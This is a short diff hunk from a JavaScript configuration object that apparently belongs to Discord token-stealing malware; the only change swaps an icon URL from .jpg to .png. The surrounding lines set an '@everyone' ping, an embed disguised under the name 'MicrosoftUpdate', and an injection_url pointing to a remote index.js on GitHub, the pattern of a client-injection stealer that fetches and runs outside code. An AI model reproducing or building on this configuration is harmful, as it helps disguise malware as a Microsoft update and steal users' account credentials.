@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'MicrosoftUpdate', 
-  embed_icon: 'https://raw.githubusercontent.com/leodiscords/test/main/mi.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/leodiscords/test/main/mi.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/leodiscords/test/main/index.js', 
   /**
